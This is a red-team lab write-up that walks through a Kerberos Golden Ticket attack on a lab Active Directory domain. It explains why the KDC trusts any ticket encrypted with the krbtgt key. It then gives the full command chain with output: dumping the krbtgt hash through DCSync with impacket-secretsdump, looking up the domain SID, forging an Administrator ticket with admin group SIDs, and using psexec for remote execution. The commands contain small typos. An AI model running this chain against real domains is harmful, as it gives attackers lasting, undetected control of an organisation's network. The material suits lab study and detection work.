Objective:

Forge a Kerberos TGT offline using the krbtgt account's NT hash,
bypassing the entire AS exchange and achieving persistent, unchecked domain access.

Why It Works:

The KDC's entire trust model is based on one assumption: "if this TGT blob decrypts correctly using my krbtgt key,
everything inside it is legitimate." There is no issued-ticket registry — Kerberos is stateless.
An attacker who holds krbtgt's NT hash can encrypt an arbitrary TGT with that key,
and the KDC will accept it as genuine because it decrypts correctly.

Attack Chain

Step 1 — Obtain krbtgt hash via DCSync
bash

impacket-secretsdump redteamlab.local/Administrator:'<password>' \
  -dc-ip 192.168.56.101

  Result:krbtgt:502:
  aad3b435b51404eeaad3b435b51404ee:dc48810c03b2c638c0cf41bc57c0d120

  step 2 - obtain Domain SID 
   bash
    
     impacket-lookupsid redteamlab.local/Administrator:'<password>' \
     @192.168.56.101

  Result:S-1-5-21-4152727142-2927276756-3439155973

Step 3 — Forge the Golden Ticket
bash
impacket-ticketer \
  -domain-sid S-1-5-21-4152727142-2927276756-3439155973 \
  -nthash dc48810c03b2c638c0cf41bc57c0d120 \
  -domain redteamlab.local \
  -user-id 500 \
  -extra-sid S-1-5-21-4152727142-2927276756-3439155973-512,\
S-1-5-21-4152727142-2927276756-3439155973-519 \
  Administrator

output:[*] Saving ticket in Administrator .ccache

Step 4 - Load ticket and verfiy
bash
   export rt KRB5CCNAME=$(pwd)/Administrator.ccache
   klist -c Administrator.ccache

Step 5 - Use ticket(hostname,not IP -Kerberos requires SPN match)
bash 
impacket-psexec -k -no-pass \
  redteamlab.local/Administrator@WIN-56JEHJD0RI3.redteamlab.local

